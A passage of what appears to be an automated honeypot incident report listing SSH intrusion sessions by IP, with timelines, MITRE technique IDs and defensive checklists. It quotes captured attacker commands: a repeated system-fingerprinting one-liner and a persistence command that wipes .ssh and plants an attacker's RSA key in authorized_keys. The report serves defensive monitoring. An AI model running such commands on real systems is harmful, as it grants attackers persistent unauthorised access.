| `2026-08-29 13:06:18` | `cowrie.command.input` |
| `2026-08-29 13:06:18` | `cowrie.command.input` |
| `2026-08-29 13:06:18` | `cowrie.command.input` |
| `2026-08-29 13:06:18` | `cowrie.command.input` |
| `2026-08-29 13:06:18` | `cowrie.log.closed` |
| `2026-08-29 13:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8532ca5f50fd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:07 |
| **Last Seen** | 2026-08-29 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:07:08` | `cowrie.session.connect` |
| `2026-08-29 13:07:08` | `cowrie.client.version` |
| `2026-08-29 13:07:08` | `cowrie.client.kex` |
| `2026-08-29 13:07:09` | `cowrie.login.success` |
| `2026-08-29 13:07:09` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:07:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:07:09` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-543236a63603

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:08 |
| **Last Seen** | 2026-08-29 13:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:08:11` | `cowrie.session.connect` |
| `2026-08-29 13:08:11` | `cowrie.client.version` |
| `2026-08-29 13:08:11` | `cowrie.client.kex` |
| `2026-08-29 13:08:12` | `cowrie.login.success` |
| `2026-08-29 13:08:13` | `cowrie.session.params` |
| `2026-08-29 13:08:13` | `cowrie.command.input` |
| `2026-08-29 13:08:13` | `cowrie.command.input` |
| `2026-08-29 13:08:13` | `cowrie.command.input` |
| `2026-08-29 13:08:13` | `cowrie.command.input` |
| `2026-08-29 13:08:13` | `cowrie.command.input` |
| `2026-08-29 13:08:13` | `cowrie.command.success` |
| `2026-08-29 13:08:13` | `cowrie.command.input` |
| `2026-08-29 13:08:13` | `cowrie.command.input` |
| `2026-08-29 13:08:13` | `cowrie.command.input` |
| `2026-08-29 13:08:13` | `cowrie.command.input` |
| `2026-08-29 13:08:14` | `cowrie.log.closed` |
| `2026-08-29 13:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78d387a1e824

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:10 |
| **Last Seen** | 2026-08-29 13:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:10:02` | `cowrie.session.connect` |
| `2026-08-29 13:10:02` | `cowrie.client.version` |
| `2026-08-29 13:10:02` | `cowrie.client.kex` |
| `2026-08-29 13:10:03` | `cowrie.login.success` |
| `2026-08-29 13:10:04` | `cowrie.session.params` |
| `2026-08-29 13:10:04` | `cowrie.command.input` |
| `2026-08-29 13:10:04` | `cowrie.command.input` |
| `2026-08-29 13:10:04` | `cowrie.command.input` |
| `2026-08-29 13:10:04` | `cowrie.command.input` |
| `2026-08-29 13:10:04` | `cowrie.command.input` |
| `2026-08-29 13:10:04` | `cowrie.command.success` |
| `2026-08-29 13:10:04` | `cowrie.command.input` |
| `2026-08-29 13:10:04` | `cowrie.command.input` |
| `2026-08-29 13:10:04` | `cowrie.command.input` |
| `2026-08-29 13:10:04` | `cowrie.command.input` |
| `2026-08-29 13:10:04` | `cowrie.log.closed` |
| `2026-08-29 13:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e75e7cc5d1d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:11 |
| **Last Seen** | 2026-08-29 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:11:42` | `cowrie.session.connect` |
| `2026-08-29 13:11:42` | `cowrie.client.version` |
| `2026-08-29 13:11:42` | `cowrie.client.kex` |
| `2026-08-29 13:11:43` | `cowrie.login.success` |
| `2026-08-29 13:11:43` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:11:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:11:43` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:11:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89161d68c1c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:11 |
| **Last Seen** | 2026-08-29 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:11:59` | `cowrie.session.connect` |
| `2026-08-29 13:11:59` | `cowrie.client.version` |
| `2026-08-29 13:12:00` | `cowrie.client.kex` |
| `2026-08-29 13:12:00` | `cowrie.login.success` |
| `2026-08-29 13:12:01` | `cowrie.session.params` |
| `2026-08-29 13:12:01` | `cowrie.command.input` |
| `2026-08-29 13:12:01` | `cowrie.command.input` |
| `2026-08-29 13:12:01` | `cowrie.command.input` |
| `2026-08-29 13:12:01` | `cowrie.command.input` |
| `2026-08-29 13:12:01` | `cowrie.command.input` |
| `2026-08-29 13:12:01` | `cowrie.command.success` |
| `2026-08-29 13:12:01` | `cowrie.command.input` |
| `2026-08-29 13:12:01` | `cowrie.command.input` |
| `2026-08-29 13:12:01` | `cowrie.command.input` |
| `2026-08-29 13:12:01` | `cowrie.command.input` |
| `2026-08-29 13:12:01` | `cowrie.log.closed` |
| `2026-08-29 13:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87fa99871a72

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:14 |
| **Last Seen** | 2026-08-29 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:14:07` | `cowrie.session.connect` |
| `2026-08-29 13:14:07` | `cowrie.client.version` |
| `2026-08-29 13:14:07` | `cowrie.client.kex` |
| `2026-08-29 13:14:08` | `cowrie.login.success` |
| `2026-08-29 13:14:08` | `cowrie.session.params` |
| `2026-08-29 13:14:08` | `cowrie.command.input` |
| `2026-08-29 13:14:08` | `cowrie.command.input` |
| `2026-08-29 13:14:08` | `cowrie.command.input` |
| `2026-08-29 13:14:08` | `cowrie.command.input` |
| `2026-08-29 13:14:08` | `cowrie.command.input` |
| `2026-08-29 13:14:08` | `cowrie.command.success` |
| `2026-08-29 13:14:08` | `cowrie.command.input` |
| `2026-08-29 13:14:08` | `cowrie.command.input` |
| `2026-08-29 13:14:08` | `cowrie.command.input` |
| `2026-08-29 13:14:08` | `cowrie.command.input` |
| `2026-08-29 13:14:08` | `cowrie.log.closed` |
| `2026-08-29 13:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd0cd858c356

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:15 |
| **Last Seen** | 2026-08-29 13:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:15:55` | `cowrie.session.connect` |
| `2026-08-29 13:15:55` | `cowrie.client.version` |
| `2026-08-29 13:15:55` | `cowrie.client.kex` |
| `2026-08-29 13:15:57` | `cowrie.login.success` |
| `2026-08-29 13:15:58` | `cowrie.session.params` |
| `2026-08-29 13:15:58` | `cowrie.command.input` |
| `2026-08-29 13:15:58` | `cowrie.command.input` |
| `2026-08-29 13:15:58` | `cowrie.command.input` |
| `2026-08-29 13:15:58` | `cowrie.command.input` |
| `2026-08-29 13:15:58` | `cowrie.command.input` |
| `2026-08-29 13:15:58` | `cowrie.command.success` |
| `2026-08-29 13:15:58` | `cowrie.command.input` |
| `2026-08-29 13:15:58` | `cowrie.command.input` |
| `2026-08-29 13:15:58` | `cowrie.command.input` |
| `2026-08-29 13:15:58` | `cowrie.command.input` |
| `2026-08-29 13:15:59` | `cowrie.log.closed` |
| `2026-08-29 13:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f10a3a7dce

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:17 |
| **Last Seen** | 2026-08-29 13:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:17:32` | `cowrie.session.connect` |
| `2026-08-29 13:17:33` | `cowrie.client.version` |
| `2026-08-29 13:17:33` | `cowrie.client.kex` |
| `2026-08-29 13:17:34` | `cowrie.login.success` |
| `2026-08-29 13:17:35` | `cowrie.session.params` |
| `2026-08-29 13:17:35` | `cowrie.command.input` |
| `2026-08-29 13:17:35` | `cowrie.command.input` |
| `2026-08-29 13:17:35` | `cowrie.command.input` |
| `2026-08-29 13:17:35` | `cowrie.command.input` |
| `2026-08-29 13:17:35` | `cowrie.command.input` |
| `2026-08-29 13:17:35` | `cowrie.command.success` |
| `2026-08-29 13:17:35` | `cowrie.command.input` |
| `2026-08-29 13:17:35` | `cowrie.command.input` |
| `2026-08-29 13:17:35` | `cowrie.command.input` |
| `2026-08-29 13:17:35` | `cowrie.command.input` |
| `2026-08-29 13:17:35` | `cowrie.log.closed` |
| `2026-08-29 13:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0de6ee6cc483

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:17 |
| **Last Seen** | 2026-08-29 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:17:38` | `cowrie.session.connect` |
| `2026-08-29 13:17:38` | `cowrie.client.version` |
| `2026-08-29 13:17:38` | `cowrie.client.kex` |
| `2026-08-29 13:17:39` | `cowrie.login.success` |
| `2026-08-29 13:17:39` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:17:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:17:40` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88ab6d5801ae

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-29 13:18 |
| **Last Seen** | 2026-08-29 13:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:18:04` | `cowrie.session.connect` |
| `2026-08-29 13:18:04` | `cowrie.client.version` |
| `2026-08-29 13:18:04` | `cowrie.client.kex` |
| `2026-08-29 13:18:05` | `cowrie.login.success` |
| `2026-08-29 13:18:05` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:18:05` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:18:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bfaec2f7318

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:19 |
| **Last Seen** | 2026-08-29 13:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:19:13` | `cowrie.session.connect` |
| `2026-08-29 13:19:14` | `cowrie.client.version` |
| `2026-08-29 13:19:14` | `cowrie.client.kex` |
| `2026-08-29 13:19:21` | `cowrie.login.success` |
| `2026-08-29 13:19:23` | `cowrie.session.params` |
| `2026-08-29 13:19:23` | `cowrie.command.input` |
| `2026-08-29 13:19:23` | `cowrie.command.input` |
| `2026-08-29 13:19:23` | `cowrie.command.input` |
| `2026-08-29 13:19:23` | `cowrie.command.input` |
| `2026-08-29 13:19:23` | `cowrie.command.input` |
| `2026-08-29 13:19:23` | `cowrie.command.success` |
| `2026-08-29 13:19:23` | `cowrie.command.input` |
| `2026-08-29 13:19:23` | `cowrie.command.input` |
| `2026-08-29 13:19:23` | `cowrie.command.input` |
| `2026-08-29 13:19:23` | `cowrie.command.input` |
| `2026-08-29 13:19:24` | `cowrie.log.closed` |
| `2026-08-29 13:19:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e04ab57e3d42

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 13:21 |
| **Last Seen** | 2026-08-29 13:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:21:03` | `cowrie.session.connect` |
| `2026-08-29 13:21:03` | `cowrie.client.version` |
| `2026-08-29 13:21:03` | `cowrie.client.kex` |
| `2026-08-29 13:21:04` | `cowrie.login.success` |
| `2026-08-29 13:21:04` | `cowrie.direct-tcpip.request` |
| `2026-08-29 13:21:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 13:21:04` | `cowrie.direct-tcpip.data` |
| `2026-08-29 13:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc1e37f24f12

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 13:21 |
| **Last Seen** | 2026-08-29 13:21 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:21:05` | `cowrie.session.connect` |
| `2026-08-29 13:21:06` | `cowrie.client.version` |
| `2026-08-29 13:21:06` | `cowrie.client.kex` |
| `2026-08-29 13:21:13` | `cowrie.login.success` |
| `2026-08-29 13:21:18` | `cowrie.session.params` |
| `2026-08-29 13:21:18` | `cowrie.command.input` |
| `2026-08-29 13:21:18` | `cowrie.command.input` |
| `2026-08-29 13:21:18` | `cowrie.command.input` |
| `2026-08-29 13:21:18` | `cowrie.command.input` |
| `2026-08-29 13:21:18` | `cowrie.command.input` |
| `2026-08-29 13:21:18` | `cowrie.command.success` |
| `2026-08-29 13:21:18` | `cowrie.command.input` |
| `2026-08-29 13:21:18` | `cowrie.command.input` |
| `2026-08-29 13:21:18` | `cowrie.command.input` |
| `2026-08-29 13:21:18` | `cowrie.command.input` |
| `2026-08-29 13:21:19` | `cowrie.log.closed` |
| `2026-08-29 13:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f959e03e312f

| Field | Detail |
|---|---|
| **Source IP** | `174.97.200[.]219` |
| **First Seen** | 2026-08-29 13:21 |
| **Last Seen** | 2026-08-29 13:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:21:39` | `cowrie.session.connect` |
| `2026-08-29 13:21:39` | `cowrie.client.version` |
| `2026-08-29 13:21:39` | `cowrie.client.kex` |
| `2026-08-29 13:21:40` | `cowrie.login.success` |
| `2026-08-29 13:21:40` | `cowrie.session.params` |
| `2026-08-29 13:21:40` | `cowrie.command.input` |
| `2026-08-29 13:21:40` | `cowrie.command.failed` |
| `2026-08-29 13:21:40` | `cowrie.log.closed` |
| `2026-08-29 13:21:41` | `cowrie.session.params` |
| `2026-08-29 13:21:41` | `cowrie.command.input` |
| `2026-08-29 13:21:41` | `cowrie.session.file_download` |
| `2026-08-29 13:21:41` | `cowrie.log.closed` |
| `2026-08-29 13:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.97.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `174.97.200[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8e9d32200f

| Field | Detail |
|---|---|
| **Source IP** | `174.97.200[.]219` |
| **First Seen** | 2026-08-29 13:21 |
| **Last Seen** | 2026-08-29 13:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 13:21:41` | `cowrie.session.connect` |
